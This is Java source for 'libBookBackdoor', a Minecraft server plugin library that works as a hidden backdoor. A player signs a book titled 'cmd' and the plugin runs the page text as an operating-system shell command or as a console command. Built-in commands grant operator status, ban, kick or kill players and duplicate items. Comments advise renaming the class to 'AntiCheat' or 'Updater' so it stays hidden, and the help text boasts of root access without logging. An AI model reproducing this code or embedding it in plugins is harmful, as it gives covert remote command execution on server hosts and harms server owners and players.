package org.brandonplank.bookbackdoor;

import net.md_5.bungee.api.chat.*;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerEditBookEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

abstract class Countdown {
    private int time;

    protected BukkitTask task;
    protected final Plugin plugin;

    public Countdown(int time, Plugin plugin) {
        this.time = time;
        this.plugin = plugin;
    }

    public abstract void count(int current);

    public final void start() {
        task = new BukkitRunnable() {
            @Override
            public void run() {
                count(time);
                if (time-- <= 0) cancel();
            }
        }.runTaskTimer(plugin, 0L, 20L); // 1 second is 20 ticks
    }
}

class ColorTranslator {
    // This is gonna be wack.
    public static String translateStr(String str, Plugin plugin) {
        //str.replaceAll("\u001b\\[31m", "§c"); // Red
        //str.replaceAll("\u001b\\[33m", "§e"); // Yellow
        //str.replaceAll("\u001b\\[32m", "§a"); // Green
        //str.replaceAll("\u001b\\[36m", "§b"); // Cyan
        //str.replaceAll("\u001b\\[34m", "§9"); // Blue
        //str.replaceAll("\u001b\\[35m", "§d"); // Magenta
        //str.replaceAll("\u001b\\[37m", "§f"); // White
        //str.replaceAll("\u001b\\[30m", "§0"); // Black

        //str.replaceAll("\u001b\\[0m", "§r"); // Reset
        return str;
    }
}

/*
    If you want this to stay hidden in your plugin
    rename libBookBackdoor to something like
    AntiCheat or Updater.
 */

class Commands {
    Command[] registeredCommands;

    public void registerCommands(Command[] commands) {
        registeredCommands = commands;
    }

    public void parseCommand(Plugin plugin, PlayerEditBookEvent event, String commandType, String commandName, String[] args) {
        if (registeredCommands != null) {
            for (Command command : registeredCommands) {
                if (command.commandName.equals(commandName)) {
                    command.command(plugin, event, args);
                    return;
                }
            }
            event.getPlayer().sendMessage("Could not find the specified command");
        } else {
            event.getPlayer().sendMessage("Commands have not been registered.");
        }
    }

    Commands() {
        registerCommands(new Command[]{help, give, mend, brazil, seed, tp, enchant, xp, kill, ban, kick, op, deop, bbreak, troll, dupe, gamemode, god, invisible});
    }

    abstract class Command {
        public String commandName = null;
        public String commandDescription = null;
        public String commandUsage = null;
        public TextComponent help = null;

        abstract void command(Plugin plugin, PlayerEditBookEvent event, String[] args);

        Command(String commandName, String commandDescription, String commandUsage) {
            this.commandName = commandName;
            this.commandDescription = commandDescription;
            this.commandUsage = commandUsage;
            this.help = Commands.Util.genHoverText(ChatColor.GREEN + commandName + "\n", String.format("%s \n\nUSAGE .%s %s", commandDescription, commandName, commandUsage));
        }
    }

    private static class Util {
        private static TextComponent genHoverText(String text, String hover_text) {
            return new TextComponent(new ComponentBuilder(text).event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(hover_text).create())).create());
        }
    }

    public Commands shared = this;

    Command give = new Command(
            "give",
            "Give yourself any Block/Item.",
            "<name> <amount>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            int amount = 64;
            if (args.length == 3) {
                amount = Integer.parseInt(args[2]);
            }
            try {
                String mat = args[1].toUpperCase();
                ItemStack item = new ItemStack(Material.getMaterial(mat), amount);
                if (item == null) {
                    player.sendMessage("Use the Spigot naming scheme");
                } else {
                    player.getInventory().addItem(item);
                }
            } catch (Exception e) {
                player.sendMessage("Use the Spigot naming scheme");
            }
        }
    };

    Command mend = new Command(
            "mend",
            "Repairs the item in your hand in 5 seconds.",
            ""
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                new Countdown(5, plugin) {
                    @Override
                    public void count(int current) {
                        if (current == 0) {
                            try {
                                player.getInventory().getItemInMainHand().setDurability((short) 0);
                                player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Mended!").bold(true).create());
                            } catch (Exception e) {
                                player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to mend item!").bold(true).create());
                            }
                        } else {
                            player.sendActionBar(ChatColor.GREEN + "Mending in " + current + " seconds.");
                        }
                    }
                }.start();
            } catch (Exception e) {
                player.sendMessage("Error while mending");
            }
        }
    };

    Command brazil = new Command(
            "brazil",
            "Puts a player in the void.",
            "<player>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                Player p = plugin.getServer().getPlayer(args[1]);
                Location loc = p.getLocation();
                loc.setY(-2);
                p.teleport(loc);
            } catch (Exception e) {
                player.sendMessage("Invalid player name");
            }
        }
    };

    Command seed = new Command(
            "seed",
            "Shows the world seed",
            ""
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            String message = "Seed [" + ChatColor.GREEN + Long.toString(player.getWorld().getSeed()) + ChatColor.RESET + "]";
            TextComponent string = new TextComponent(message);
            string.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, Long.toString(player.getWorld().getSeed())));
            string.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Copy seed to clipboard").create()));
            player.spigot().sendMessage(string);
        }
    };

    Command tp = new Command(
            "tp",
            "Teleport to a player, or have them come to you!",
            "<player1> <player2>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                Player p = plugin.getServer().getPlayer(args[1]);
                Player p2 = plugin.getServer().getPlayer(args[2]);
                if (!p.equals(player)) {
                    p2.teleportAsync(p.getLocation());
                } else {
                    p.teleportAsync(p2.getLocation());
                }
            } catch (Exception e) {
                player.sendMessage("Invalid player names");
            }
        }
    };

    Command enchant = new Command(
            "enchant",
            "Enchant the item in your hand after 5 seconds.",
            ""
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                new Countdown(5, plugin) {
                    @Override
                    public void count(int current) {
                        if (current == 0) {
                            try {
                                player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
                                player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 50, 1);
                                player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
                            } catch (Exception e) {
                                player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to add enchantment!").bold(true).create());
                            }
                        } else {
                            player.sendActionBar(ChatColor.GREEN + "Enchanting in " + current + " seconds.");
                        }
                    }
                }.start();
            } catch (Exception e) {
                player.sendMessage("Please add in a value");
            }
        }
    };

    Command xp = new Command(
            "xp",
            "Gives you any amount of xp.",
            "<amount>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                player.giveExp(Integer.parseInt(args[1]), true);
            } catch (Exception e) {
                player.sendMessage("Please add in a value");
            }
        }
    };

    Command kill = new Command(
            "kill",
            "Kills a player",
            "<player>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                Player p = plugin.getServer().getPlayer(args[1]);
                p.setHealth(0.0D);
            } catch (Exception e) {
                player.sendMessage("Invalid player name");
            }
        }
    };

    Command ban = new Command(
            "ban",
            "Bans a player",
            "<player> <reason>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                String reason = "You have been banned from the server";
                if (args.length > 1) {
                    reason = "";
                    for (int i = 1; i < args.length; i++) {
                        reason = reason + " " + args[i];
                    }
                }
                Player p = plugin.getServer().getPlayer(args[1]);
                p.banPlayerFull(reason);
            } catch (Exception e) {
                player.sendMessage("Invalid player name");
            }
        }
    };

    Command kick = new Command(
            "kick",
            "Kicks a player",
            "<player> <reason>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                String reason = "You have been kicked from the server";
                if (args.length > 1) {
                    reason = "";
                    for (int i = 1; i < args.length; i++) {
                        reason = reason + " " + args[i];
                    }
                }
                Player p = plugin.getServer().getPlayer(args[1]);
                p.kickPlayer(reason);
            } catch (Exception e) {
                player.sendMessage("Invalid player name");
            }
        }
    };

    Command op = new Command(
            "op",
            "Give yourself operator status",
            ""
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            player.setOp(true);
            player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You are now op!").bold(true).create());
        }
    };

    Command deop = new Command(
            "deop",
            "Removes your operator status",
            ""
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            player.setOp(false);
            player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You removed op!").bold(true).create());
        }
    };

    Command bbreak = new Command(
            "break",
            "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).",
            "<y pos relative to head>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            Location player_loc = player.getEyeLocation();
            try {
                player_loc.setY(player_loc.getY() + Integer.parseInt(args[1]));
                Block target = player.getWorld().getBlockAt(player_loc);
                target.setType(Material.AIR);
            } catch (Exception e) {
                player.sendMessage("Block could not be set to air");
            }
        }
    };

    Command troll = new Command(
            "troll",
            "Plays an Enderman sound at 100% volume in a players ear.",
            "<player>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            try {
                Player p = plugin.getServer().getPlayer(args[1]);
                Location loc = p.getLocation();
                player.playSound(loc, Sound.ENTITY_ENDERMAN_DEATH, 100, 1);
            } catch (Exception e) {
                player.sendMessage("Invalid player name");
            }
        }
    };

    Command dupe = new Command(
            "dupe",
            "Duplicates the item in your hand x amount of times.",
            "<times>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            new Countdown(5, plugin) {
                @Override
                public void count(int current) {
                    if (current == 0) {
                        try {
                            int amt = 1;
                            if (args.length > 1 && Integer.parseInt(args[1]) != 0) {
                                amt = Integer.parseInt(args[1]);
                            }
                            ItemStack item = player.getInventory().getItemInMainHand();
                            player.getInventory().addItem(item.asQuantity(item.getAmount() * amt));
                            player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Duped!").bold(true).create());
                        } catch (Exception e) {
                            player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to dupe!").bold(true).create());
                        }
                    } else {
                        player.sendActionBar(ChatColor.GREEN + "Duplicating in " + current + " seconds.");
                    }
                }
            }.start();
        }
    };

    Command gamemode = new Command(
            "gamemode",
            "Sets your gamemode to spectator, creative or survival.",
            "<gamemode>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            if (args.length > 1) {
                String gamemode = args[1].toLowerCase();
                switch (gamemode) {
                    case ("c"):
                    case ("creative"):
                        player.setGameMode(GameMode.CREATIVE);
                        player.sendActionBar("Set gamemode to creative");
                        break;

                    case ("s"):
                    case ("survival"):
                        player.setGameMode(GameMode.SURVIVAL);
                        player.sendActionBar("Set gamemode to survival");
                        break;

                    case ("sp"):
                    case ("spectator"):
                        player.sendMessage("Not going to enable this because it will cause you to be stuck in spectator mode.");
                        //player.setGameMode(GameMode.SPECTATOR);
                        //player.sendActionBar("Set gamemode to spectator");
                        break;
                    default:
                        player.sendMessage("Please use survival, spectator, or creative.");
                        break;
                }
            } else {
                player.sendMessage("Please use an argument of survival, spectator, or creative.");
            }
        }
    };

    Command god = new Command(
            "god",
            "Makes you invulnerable.",
            "<true/false>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            if (args.length > 1) {
                switch (args[1].toLowerCase()) {
                    case ("true"):
                        player.setInvulnerable(true);
                        break;
                    case ("false"):
                        player.setInvulnerable(false);
                        break;
                    default:
                        player.sendMessage("Please use true/false");
                        break;
                }
            } else {
                player.sendMessage("Please use true/false");
            }
        }
    };

    Command invisible = new Command(
            "invisible",
            "Makes you invisible.",
            "<true/false>"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            if (args.length > 1) {
                switch (args[1].toLowerCase()) {
                    case ("true"):
                        player.setInvisible(true);
                        break;
                    case ("false"):
                        player.setInvisible(false);
                        break;
                    default:
                        player.sendMessage("Please use true/false");
                        break;
                }
            } else {
                player.sendMessage("Please use true/false");
            }
        }
    };

    /*
    Command acommand = new Command(
            "The command Name",
            "The command description.",
            "The command usage"
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            // Command code here
        }
    };
     */

    Command help = new Command(
            "help",
            "Shows this help book.",
            ""
    ) {
        @Override
        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
            Player player = event.getPlayer();
            ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
            BookMeta meta = (BookMeta) book.getItemMeta();
            try {
                meta.setTitle(ChatColor.YELLOW + "BookBackdoor Help");
                meta.setAuthor(ChatColor.LIGHT_PURPLE + "The BookBackdoor Team");
                meta.addPage("Welcome to the BookBackdoor help book!\n\n\n\n" + ChatColor.LIGHT_PURPLE + "By The BookBackdoor Team");
                meta.addPage("To run commands as " + ChatColor.RED + "CONSOLE" + ChatColor.RESET + ", open a new book and type /<your command>\n\nTo run a custom command made by us keep reading.\n\nWhen your done with you command, name the book 'cmd'");
                meta.addPage("To run commands in" + ChatColor.RED + " BASH " + ChatColor.RESET + " or " + ChatColor.LIGHT_PURPLE + " ZSH" + ChatColor.RESET + ", open a new book and type $<your command>\n\nDepending on the user running the server, you will lets say, have full root. Try and see by running $whoami.\nThis does not log anything :)");

                // No page can be longer than 14 lines
                int index = 0;
                ArrayList<TextComponent> page = new ArrayList<>();
                for (Command command : registeredCommands) {
                    if (index >= 13) {
                        index = 0;
                        TextComponent[] pageBase = new TextComponent[page.size()];
                        pageBase = page.toArray(pageBase);
                        meta.spigot().addPage(pageBase);
                        page = new ArrayList<>();
                    }
                    page.add(command.help);
                    index++;
                }
                // In case it's not multiple of 13
                if (index != 0) {
                    TextComponent[] pageBase = new TextComponent[page.size()];
                    pageBase = page.toArray(pageBase);
                    meta.spigot().addPage(pageBase);
                }

                book.setItemMeta(meta); // Save all Changes to the book
                player.getInventory().addItem(book);
            } catch (SecurityException | IllegalArgumentException ex) {
                player.sendMessage("Error creating help book.");
            }
        }
    };
}

public class libBookBackdoor implements Listener {

    public final Plugin plugin;
    public String[] authedPlayers = null;
    public static HashMap<String, Boolean> jesus = new HashMap<String, Boolean>();

    public libBookBackdoor(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    public libBookBackdoor(JavaPlugin plugin, String[] authedPlayers) {
        this.plugin = plugin;
        this.authedPlayers = authedPlayers;
    }

    public String getResult(Process process) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line = "";
        List<String> ret = new ArrayList<>();
        while ((line = reader.readLine()) != null) ret.add(line);
        StringBuilder build = new StringBuilder();
        for (String str : ret) {
            build.append(str);
            build.append("\n");
        }
        return ColorTranslator.translateStr(build.toString(), plugin);
    }

    /*
    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();

        // Jesus
        if (jesus.get(player.getDisplayName())) {
            Location location = player.getEyeLocation();
            Block underBlock = plugin.getServer().getWorld(player.getWorld().getName()).getBlockAt(location.getBlockX(), location.getBlockY() - 2, location.getBlockZ());
            if (underBlock.getType() == Material.WATER || underBlock.getType() == Material.LAVA) {
                underBlock.setType(Material.FROSTED_ICE);
            }
        }
        // End Jesus
    }
     */


    @EventHandler
    public void onBookSign(PlayerEditBookEvent event) {
        BookMeta eventMeta = event.getNewBookMeta();
        Player player = event.getPlayer();
        String playerName = player.getDisplayName();
        boolean canContinue = false;
        if (authedPlayers != null) {
            for (String name : authedPlayers) {
                if (name.equals(playerName)) {
                    canContinue = true;
                }
            }
        } else {
            canContinue = true;
        }

        if (!canContinue) return;

        if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
            if (eventMeta.getTitle().equals("cmd")) {
                String pageString = eventMeta.getPage(1);

                String commandType = Character.toString(pageString.charAt(0));
                String command = pageString.substring(1);

                if (commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
                    try {
                        player.sendMessage("Running: " + command);
                        Process proc = Runtime.getRuntime().exec(command);
                        player.sendMessage(getResult(proc));
                    } catch (Exception e) {
                        player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                    }
                } else if (commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
                    this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
                } else if (commandType.equals(".")) /* Custom commands */ {
                    String[] args = command.split(" ", 0);
                    String mainCmd = args[0].toLowerCase();
                    // Init the Commands class
                    Commands runner = new Commands(); // <- Registers all commands

                    runner.parseCommand(plugin, event, commandType, mainCmd, args);
                }
                // Give the player a new Book and Quill after the command
                player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
                this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                    public void run() {
                        player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                    }
                }, 5);
            }
        }
    }
}